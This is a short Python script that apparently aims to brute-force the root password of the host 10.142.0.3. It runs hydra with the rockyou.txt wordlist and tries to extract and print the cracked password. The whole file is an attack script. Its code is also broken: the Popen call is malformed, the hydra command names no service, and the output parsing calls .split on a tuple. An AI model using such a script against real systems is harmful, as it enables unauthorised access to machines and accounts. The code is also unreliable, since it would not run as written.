from pexpect import pxssh
import subprocess
import numpy as np
import re
import get_lan_ip
import getpass

output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 10.142.0.3"], stdout = subprocess.PIPE)
response = output.communicate()
password = response.split("password: ", 1)[1]
print("password is", password)
